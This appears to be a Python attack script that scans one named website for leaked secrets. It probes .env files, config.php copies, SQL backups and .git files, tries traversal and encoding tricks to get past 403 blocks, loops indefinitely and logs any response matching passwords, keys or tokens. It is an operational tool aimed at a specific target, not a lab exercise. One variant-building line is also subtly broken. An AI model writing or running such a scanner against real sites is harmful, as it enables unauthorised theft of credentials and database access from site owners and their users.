#!/usr/bin/env python3
"""fffzz.lol config / backup / .git leak scanner with 403 bypass variants."""
import json
import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://fffzz.lol/shop/"
ROOT = "https://fffzz.lol/"
OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/workspace/results/fffzz.lol/kami_allin_20260717")
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / ".cookies_leak")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
LOG = open(OUT / "config_leak.log", "a", buffering=1)

SENSITIVE = re.compile(
    r"(SYS_KEY|APP_KEY|DB_PASSWORD|DB_HOST|api_key|apikey|mysql|password\s*[=:]|secret|token|ref:\s*ref)",
    re.I,
)

PATHS = [
    ".env", ".env.bak", ".env.old", ".env.prod", ".env.local", ".env.save",
    "config.php", "config.php.bak", "config.php.old", "config.php~", "config.php.swp",
    "includes/config.php", "core/config.php", "application/config.php", "includes/common.php",
    "backup.sql", "backup.sql.bak", "backup.zip", "backup.tar.gz", "db.sql", "fffzz.sql",
    ".git/HEAD", ".git/config", ".git/logs/HEAD", ".git/index",
    "install/install.lock", "install/config.php", "runtime/log/", "runtime/cache/",
    "composer.json", "composer.lock", "package.json",
    "other/config.php", "other/epay.config.php", "includes/epay.config.php",
    "admin/config.php", "user/config.php", "sup/config.php",
]

BYPASS_PREFIX = [
    "", "%2e/", "..%2f", "..;/", ".%2e/", "%2e%2e/", "....//", ".;/",
    "%252e%252e/", "..%252f", "/%2e%2e/", "//", "/./", "/%2e/",
]


def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    LOG.write(line + "\n")


def save_hit(kind, data):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, **data}
    with HITS.open("a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {str(data)[:300]}")


def curl(url, retry=2):
    for _ in range(retry):
        cmd = [
            "curl", "-sk", "--max-time", "12", "-b", JAR, "-c", JAR, "-A", UA,
            "-H", f"Referer: {BASE}", "-w", "\n__HTTP__%{http_code}", url,
        ]
        try:
            raw = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout or ""
            m = re.search(r"__HTTP__(\d+)$", raw)
            if m:
                return int(m.group(1)), raw[:m.start()]
        except Exception:
            pass
        time.sleep(0.5)
    return 0, ""


def site_up():
    code, body = curl(f"{BASE}ajax.php?act=getcount")
    if code == 200 and body.strip():
        return True
    code, body = curl(f"{BASE}%61pi.php/?act=search&id=1")
    return code == 200 and body.strip()


def variants(path):
    urls = set()
    for base in (BASE, ROOT, ROOT + "shop/"):
        for prefix in BYPASS_PREFIX:
            p = prefix + path
            urls.add(base + p)
            urls.add(base + quote(p, safe="/"))
            urls.add(base + path + "%00")
            urls.add(base + path + "/.")
            urls.add(base + path.upper() if path.islower() else path.lower())
    return urls


def scan_once():
    hits = 0
    for path in PATHS:
        for url in variants(path):
            code, body = curl(url)
            if code not in (200, 206) or len(body) < 20:
                continue
            if any(x in body[:200].lower() for x in ("403 forbidden", "404 not found", "no input file")):
                continue
            if SENSITIVE.search(body) or path.endswith((".sql", ".env", ".git/HEAD", "config.php")):
                save_hit("config_leak", {"url": url, "code": code, "resp": body[:800]})
                hits += 1
            elif "ref:" in body or "commit" in body.lower():
                save_hit("git_leak", {"url": url, "resp": body[:400]})
                hits += 1
        time.sleep(0.02)
    return hits


def main():
    log("config leak scanner start")
    while True:
        if not site_up():
            log("site down, wait 30s")
            time.sleep(30)
            continue
        log("site up, scanning...")
        n = scan_once()
        log(f"scan round done hits={n}")
        time.sleep(120)


if __name__ == "__main__":
    main()
